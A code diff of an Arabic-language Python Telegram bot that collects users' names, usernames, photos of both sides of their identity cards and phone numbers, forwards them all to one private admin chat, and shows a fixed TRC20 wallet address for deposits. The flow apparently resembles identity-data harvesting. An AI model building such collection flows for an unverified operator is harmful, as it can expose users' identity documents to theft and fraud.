@@ -72,7 +72,6 @@ def start_registration(message):
     )
     bot.register_next_step_handler(msg, process_name)
 
-# الخطوة 1: استلام الاسم وسؤال المستخدم عن المعرف (اليوزر)
 def process_name(message):
     if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
         cancel_operation(message)
@@ -97,7 +96,6 @@ def process_name(message):
     msg = bot.send_message(chat_id, username_instructions, reply_markup=cancel_keyboard())
     bot.register_next_step_handler(msg, process_username_input)
 
-# الخطوة 2: استلام المعرف وطلب صورة الهوية الأولى
 def process_username_input(message):
     if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
         cancel_operation(message)
@@ -109,7 +107,6 @@ def process_username_input(message):
     msg = bot.send_message(chat_id, "الرجاء إرسال صورة الوجه الأول من الهوية:", reply_markup=cancel_keyboard())
     bot.register_next_step_handler(msg, process_photo_1)
 
-# الخطوة 3: استلام صورة الهوية الأولى وطلب صورة الهوية الثانية
 def process_photo_1(message):
     if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
         cancel_operation(message)
@@ -125,7 +122,6 @@ def process_photo_1(message):
     msg = bot.send_message(chat_id, "تم استلام الصورة الأولى. الآن أرسل صورة الوجه الثاني للهوية:", reply_markup=cancel_keyboard())
     bot.register_next_step_handler(msg, process_photo_2)
 
-# الخطوة 4: استلام صورة الهوية الثانية وطلب رقم الهاتف
 def process_photo_2(message):
     if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
         cancel_operation(message)
@@ -141,7 +137,6 @@ def process_photo_2(message):
     msg = bot.send_message(chat_id, "تم استلام صور الهوية. أرسل رقم هاتفك الآن:", reply_markup=cancel_keyboard())
     bot.register_next_step_handler(msg, process_phone)
 
-# الخطوة 5: استلام رقم الهاتف وإرسال التقرير الكامل لحسابك الرقمي
 def process_phone(message):
     global client_counter
     if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
@@ -154,10 +149,8 @@ def process_phone(message):
     custom_username = user_data[chat_id]['custom_username']
     photos = user_data[chat_id]['photos']
 
-    # تنسيق رقم العميل التسلسلي (مثلاً: 01, 02, 03...)
     client_id_str = f"{client_counter:02d}"
 
-    # إرسال البيانات المجمعة كاملة إلى حسابك الخاص عبر البوت
     admin_caption = (
         f"📋 **طلب إنشاء حساب جديد**\n\n"
         f"🔢 **العميل رقم:** `#{client_id_str}`\n"
@@ -169,7 +162,6 @@ def process_phone(message):
     
     bot.send_message(MY_CHAT_ID, admin_caption, parse_mode="Markdown")
 
-    # إرسال صور الهوية إلى حسابك الخاص
     for i, photo_id in enumerate(photos, 1):
         bot.send_photo(
             MY_CHAT_ID, 
@@ -177,7 +169,6 @@ def process_phone(message):
             caption=f"📷 **صورة الهوية ({i}) للعميل رقم #{client_id_str}**"
         )
 
-    # زيادة العداد للعميل التالي ومسح الذاكرة المؤقتة
     client_counter += 1
     del user_data[chat_id]
 
@@ -203,8 +194,9 @@ def process_deposit_click(call):
     bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
 
-    # نص المحفظة مع العنوان الخاطف القابل للنسخ بنقرة واحدة
+    # نص المحفظة مع التنويه والعنوان القابل للنسخ
     deposit_text = (
+        "⚠️ **تنويه: الشبكة حصراً TRC20**\n\n"
         "📌 **تعليمات الإيداع:**\n\n"
         "يرجى التحويل إلى عنوان المحفظة التالي:\n"
         "`TQM9FVW9C4QBE6B4CDwQC8po7m15ygetrM`\n\n"
@@ -212,7 +204,9 @@ def process_deposit_click(call):
         "بعد إتمام التحويل، أرسل إشعار التحويل أو العنوان الخاص بك هنا (كنص أو صورة):"
     )
 
-    qr_file_path = "qr.jpg"
+    # تحديد المسار المطلق لصورة qr.jpg في مجلد المشروع
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    qr_file_path = os.path.join(base_dir, "qr.jpg")
     
     if os.path.exists(qr_file_path):
         with open(qr_file_path, 'rb') as photo:
